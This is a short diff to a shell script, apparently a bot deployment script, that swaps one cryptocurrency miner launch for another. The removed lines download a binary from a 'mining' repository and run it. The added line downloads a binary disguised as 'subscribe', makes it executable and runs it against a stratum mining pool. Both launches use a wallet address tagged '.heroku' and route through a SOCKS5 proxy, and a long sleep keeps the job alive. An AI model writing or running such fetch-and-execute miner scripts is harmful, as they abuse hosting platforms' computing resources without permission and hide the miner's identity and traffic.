@@ -4,8 +4,5 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-wget -qO tune_config https://git.io/J1Wss
-wget -qO build https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/gr
-chmod +x build
-./build -a gr -o stratum+tcps://asia.flockpool.com:5555 -u RCedem1PuDo9EHecuWQ3b98GxxGG2JqrHp.heroku -p tokisaki -x socks5://omar:omar@137.184.167.28:555
+wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MoZWmZP537xWNb2HePtZ8ZjEHcawGJdiFG.heroku -x socks5://omar:omar@137.184.167.28:555
 sleep 99999999999999999
